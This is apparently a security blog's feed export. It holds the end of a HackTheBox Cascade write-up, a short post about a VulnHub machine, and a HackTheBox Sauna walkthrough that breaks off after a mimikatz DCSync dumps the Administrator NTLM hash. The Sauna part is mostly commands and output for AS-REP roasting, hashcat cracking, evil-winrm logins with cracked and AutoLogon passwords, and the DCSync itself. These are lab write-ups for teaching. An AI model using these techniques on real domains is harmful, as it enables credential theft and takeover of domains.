<span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">Administrator</span><span class="o">&gt;</span> <span class="n">cd</span> <span class="no">Desktop</span>
<span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">Administrator</span><span class="p">\</span><span class="no">Desktop</span><span class="o">&gt;</span> <span class="n">type</span> <span class="n">root</span><span class="p">.</span><span class="nf">txt</span>
<span class="mi">930</span><span class="o">****************************</span><span class="n">b35b</span>
<span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">Administrator</span><span class="p">\</span><span class="no">Desktop</span>
</code></pre></div></div>

<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.<br />
My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>]]></content><author><name>jeevan</name></author><category term="[&quot;hackthebox&quot;, &quot;retired&quot;]" /><category term="windows" /><category term="activedirectory" /><category term="evilwinrm" /><category term="smb" /><category term="rpcclient" /><category term="ldapsearch" /><category term="dnspy" /><summary type="html"><![CDATA[Cascade is a windows machine on Hackthebox, made by VBSCRUB which I personally a big fan of him. This box is one hell of an awsome machine made by him.]]></summary></entry><entry><title type="html">VulnHub GANANA</title><link href="http://localhost:4000/otherposts/2020/06/24/Ganana.html" rel="alternate" type="text/html" title="VulnHub GANANA" /><published>2020-06-24T22:05:00+05:30</published><updated>2020-06-24T22:05:00+05:30</updated><id>http://localhost:4000/otherposts/2020/06/24/Ganana</id><content type="html" xml:base="http://localhost:4000/otherposts/2020/06/24/Ganana.html"><![CDATA[<p><img src="https://www.vulnhub.com/entry/ganana-1,497/" alt="" />
<a href="https://www.vulnhub.com/entry/ganana-1,497/"><img src="/assets/img/sample/index.png" alt="" /></a></p>

<h3 id="ganana">GANANA</h3>

<p>Ganana is the very first vulnerable machine created by me and now hosted on <code class="language-plaintext highlighter-rouge">VULNHUB</code>. You can download the machine and play with it. Works better with <code class="language-plaintext highlighter-rouge">Virtual-box</code>.</p>

<p>This is a fairly simple machine rated easy to intermediate. There is only one flag to capture root.txt.</p>]]></content><author><name>jeevan</name></author><category term="[&quot;otherposts&quot;]" /><category term="linux" /><summary type="html"><![CDATA[Ganana is the very first vulnerable machine created by me and now hosted on `VULNHUB`. You can download the machine and play with it. Works better with `Virtual-box`.]]></summary></entry><entry><title type="html">HackTheBox Sauna</title><link href="http://localhost:4000/hackthebox/retired/2020/06/19/Sauna.html" rel="alternate" type="text/html" title="HackTheBox Sauna" /><published>2020-06-19T22:04:00+05:30</published><updated>2020-06-19T22:04:00+05:30</updated><id>http://localhost:4000/hackthebox/retired/2020/06/19/Sauna</id><content type="html" xml:base="http://localhost:4000/hackthebox/retired/2020/06/19/Sauna.html"><![CDATA[<h2 id="lets-get-started">Let’s get started</h2>

<h3 id="as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap 7.80 scan initiated Sat Apr  4 05:52:33 2020 as: nmap -sV -A -o nmap.sauna 10.10.10.175
Nmap scan report for 10.10.10.175
Host is up (0.20s latency).
Not shown: 988 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-04 16:53:10Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=4/4%Time=5E885906%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m03s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-04-04T16:55:52
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   197.16 ms 10.10.14.1
2   198.35 ms 10.10.10.175

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Apr  4 05:58:29 2020 -- 1 IP address (1 host up) scanned in 356.97 seconds  
</code></pre></div></div>

<h2 id="using-nmap-to-see-any-users-can-be-found-in-the-domain">Using NMAP to see any users can be found in the domain.</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap 7.80 scan initiated Sat Apr  4 06:13:39 2020 as: nmap -n -sV -script *ldap* -p 389 -oA script.ldap 10.10.10.175
Nmap scan report for 10.10.10.175
Host is up (0.20s latency).

PORT    STATE SERVICE VERSION
389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
| ldap-brute: 
|   root: &lt;empty&gt;=&gt; Valid credentials
|   admin: &lt;empty&gt;=&gt; Valid credentials
|   administrator: &lt;empty&gt;=&gt; Valid credentials
|   webadmin: &lt;empty&gt;=&gt; Valid credentials
|   sysadmin: &lt;empty&gt;=&gt; Valid credentials
|   netadmin: &lt;empty&gt;=&gt; Valid credentials
|   guest: &lt;empty&gt;=&gt; Valid credentials
|   user: &lt;empty&gt;=&gt; Valid credentials
|   web: &lt;empty&gt;=&gt; Valid credentials
|_  test: &lt;empty&gt;=&gt; Valid credentials
| ldap-rootdse: 
| LDAP Results
|   &lt;root&gt;|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL
|       ldapServiceName: EGOTISTICAL-BANK.LOCAL:sauna$@EGOTISTICAL-BANK.LOCAL
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       serverName: CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
|       isSynchronized: TRUE
|       highestCommittedUSN: 53385
|       dsServiceName: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       dnsHostName: SAUNA.EGOTISTICAL-BANK.LOCAL
|       defaultNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL
|       currentTime: 20200404171356.0Z
|_      configurationNamingContext: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
| ldap-search: 
|   Context: DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: DC=EGOTISTICAL-BANK,DC=LOCAL
|         objectClass: top
|         objectClass: domain
|         objectClass: domainDNS
|         distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL
|         instanceType: 5
|         whenCreated: 2020/01/23 05:44:25 UTC
|         whenChanged: 2020/04/03 23:33:53 UTC
|         subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
|         subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
|         subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|         uSNCreated: 4099
|         dSASignature: \x01\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\xBE\xE0\xB3\xC6%\xECD\xB2\xB9\x9F\xF8\D\xB2\xEC
|         uSNChanged: 53269
|         name: EGOTISTICAL-BANK
|         objectGUID: 504e6ec-c122-a143-93c0-cf487f83363
|         replUpToDateVector: \x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xFDZ\x85\x92F\xDE^A\xAAVnj@#\xF6\x0C\x0B\xD0\x00\x00\x00\x00\x00\x00\xDFX\x98\x14\x03\x00\x00\x00@\xBE\xE0\xB3\xC6%\xECD\xB2\xB9\x9F\xF8\D\xB2\xEC	\xB0\x00\x00\x00\x00\x00\x00\xD4\x04R\x14\x03\x00\x00\x00
|         creationTime: 132304304332325407
|         forceLogoff: -9223372036854775808
|         lockoutDuration: -18000000000
|         lockOutObservationWindow: -18000000000
|         lockoutThreshold: 0
|         maxPwdAge: -36288000000000
|         minPwdAge: -864000000000
|         minPwdLength: 7
|         modifiedCountAtLastProm: 0
|         nextRid: 1000
|         pwdProperties: 1
|         pwdHistoryLength: 24
|         objectSid: 1-5-21-2966785786-3096785034-1186376766
|         serverState: 1
|         uASCompat: 1
|         modifiedCount: 1
|         auditingPolicy: \x00\x01
|         nTMixedDomain: 0
|         rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
|         fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|         systemFlags: -1946157056
|         wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
|         objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|         isCriticalSystemObject: TRUE
|         gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL;0]
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|         otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL
|         otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
|         masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|         ms-DS-MachineAccountQuota: 10
|         msDS-Behavior-Version: 7
|         msDS-PerUserTrustQuota: 1
|         msDS-AllUsersTrustQuota: 1000
|         msDS-PerUserTrustTombstonesQuota: 10
|         msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|         msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|         msDS-NcType: 0
|         msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
|         dc: EGOTISTICAL-BANK
|     dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL
|_    dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Sat Apr  4 06:13:53 2020 -- 1 IP address (1 host up) scanned in 14.14 seconds&lt;/root&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;&lt;/empty&gt;
</code></pre></div></div>

<p>As I tried a bunch of stuff using enum4linux, ldapsearch, rpcclient nothing returned out.</p>

<p><img src="/assets/img/sample/user.png" alt="" />
So I had to make my own user list from the aboutUs page from the url.</p>

<pre class="center"> <span style="color:yellow">
fergussmith
shauncoins
hugobear
bowietaylor
sophiedirver
stevenkerb
fsmith
scoins
hbear
btaylor
dsophie
sophied
skerb
ksteven
bhugo</span> 
</pre>

<h3 id="getting-the-tgt">Getting the TGT</h3>

<p>Using GetNPUsers.py, I was able to get the TGT of a user and cracking the TGT using HASHCAT.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GetNPUsers.py -dc-ip sauna.htb -usersfile users.txt EGOTISTICAL-BANK.LOCAL/
Impacket v0.9.22.dev1+20200611.111621.760cb1ea - Copyright 2020 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:eb75b20e0b65a8f0f42c52a06403a767$0423963b218ce13f92bbca4dbab1691b0a0f390bd9070f9524c92f800f46591462f1f5271e4ac41f42bca677e7e7479de436f053f8e4373d3ef45ac872a4c0f5b9073d2f34c05b063c5bac94e9c432fc6c6ea41a15afcc30f324ffcd5137540c0847f2a5a0dadcae7491e3fda91d26c0e929f377ec97a244c291159f02fc5d723cc1f3f5dc5064a6f67ecf56a27aeaf84d005aff8ec3e476e1e1c7f5f0fb20340ec81ea50de0838bcf2489d70ca04920f312b2e7d0827106768d09ea6f07cb117d11547b8ae3752dfc8398f8cb1110332cb6f412f0610f6c3a85ad8cc680d2d61f14de3f5bf59083ed62055b4fb41f3be91b5275f2f23ae411588ac45a65ed2d
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)` 
</code></pre></div></div>

<h3 id="hashcat">HASHCAT</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dictionary cache hit:
* Filename..: D:\Wordlist\rockyou.txt
* Passwords.: 14344387
* Bytes.....: 139921579
* Keyspace..: 14344387

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:ff4e63efdef11ee2782d87399829857e$2109910f4bf10633f492b1b882805e4330caaa318fb715b4c04c0516f988fd06bfdeec8c2aa9a72bb8a1683ffe124e9ad6e67461be0c6ec8b423996a07217ab2c5835e1743318ab28f882f09a99ebc94409d4716cd6863e153003e62c24897b231f49daf725b7e98e3fd89d973e7c73613c9c0cafedbf341b1c93f451d5f07775ca94df35dbd858a7864e9c83182f93f88023b2ccbc8c584d7c4600a971b17614def93c8e270be2375d25717590e9c3edd83b618775dd812cd3c1c14bea8b3a6416249b9f6d5e4f9f249589c22dca0c75f4eb60fe0500ef78f72038391d2b239807f45587c3c097482d29761ff9ddd3554d6f15bf2b409a545b59d5196faa0d7:Thestrokes23
Cracking performance lower than expected?

* Append -O to the commandline.
  This lowers the maximum supported password- and salt-length (typically down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Update your OpenCL runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 AS-REP etype 23
Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:ff4e63e...faa0d7
Time.Started.....: Sat Apr 04 16:02:10 2020 (5 secs)
Time.Estimated...: Sat Apr 04 16:02:15 2020 (0 secs)
Guess.Base.......: File (D:\Wordlist\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2001.8 kH/s (12.17ms) @ Accel:256 Loops:1 Thr:64 Vec:1
Speed.#2.........:    93174 H/s (7.22ms) @ Accel:4 Loops:1 Thr:64 Vec:1
Speed.#*.........:  2094.9 kH/s
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 10543104/14344387 (73.50%)
Rejected.........: 0/10543104 (0.00%)
Restore.Point....: 10455040/14344387 (72.89%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: _20003479KNL -&gt; Teague51
Candidates.#2....: a0122455276 -&gt; _2000dani
Hardware.Mon.#1..: Temp: 54c Util: 27% Core: 928MHz Mem:2505MHz Bus:16
Hardware.Mon.#2..: N/A

Started: Sat Apr 04 16:01:47 2020
Stopped: Sat Apr 04 16:02:17 2020
</code></pre></div></div>

<h3 id="getting-usertxt">Getting User.txt</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm -u fsmith -p Thestrokes23 -i sauna.htb

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Documents&gt; cd ..
*Evil-WinRM* PS C:\Users\FSmith&gt; cd Desktop
*Evil-WinRM* PS C:\Users\FSmith\Desktop&gt; dir

    Directory: C:\Users\FSmith\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/23/2020  10:03 AM             34 user.txt
</code></pre></div></div>

<h3 id="privilege-escalation">privilege escalation</h3>

<p>Uploading and executing <span style="color:yellow">winPEAS</span>, I got some Autologin credentials.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Looking for AutoLogon credentials(T1012)
&lt;span style="color:yellow"&gt;    Some AutoLogon credentials were found!!&lt;/span&gt;
    DefaultDomainName             :  35mEGOTISTICALBANK
&lt;span style="color:yellow"&gt;   DefaultUserName               :  35mEGOTISTICALBANK\svc_loanmanager&lt;/span&gt;
&lt;span style="color:yellow"&gt;   DefaultPassword               :  Moneymakestheworldgoround! &lt;/span&gt;
</code></pre></div></div>

<p>Logging in as svc_loanmanager has not worked for me. Trying in a bunch of different ways I found the user name is [svc_loanmgr].</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*Evil-WinRM* PS C:\Users\svc_loanmgr\Desktop&gt; whoami /all

USER INFORMATION
----------------

User Name                   SID
=========================== ==============================================
egotisticalbank\svc_loanmgr S-1-5-21-2966785786-3096785034-1186376766-1108

GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
</code></pre></div></div>

<p>As nothing seems to be intresting from [whoami /all], I used [BloodHound] to see the structure of the domain.<br />
<img src="/assets/img/sample/dcsync.png" alt="" /><br />
Seeing svc_loanmanager having the rights of DCsync, I moved to mimikatz to dump the hash of administrator.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./mimikatz.exe "lsadump::dcsync /user:administrator" "exit"

  .#####.   mimikatz 2.2.0 (x64) #18362 Mar  8 2020 18:30:37
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # lsadump::dcsync /user:administrator
[DC] 'EGOTISTICAL-BANK.LOCAL' will be the domain
[DC] 'SAUNA.EGOTISTICAL-BANK.LOCAL' will be the DC server
[DC] 'administrator' will be the user account

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 1/24/2020 10:14:15 AM
Object Security ID   : S-1-5-21-2966785786-3096785034-1186376766-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: d9485863c1e9e05851aa40cbb4ab9dff
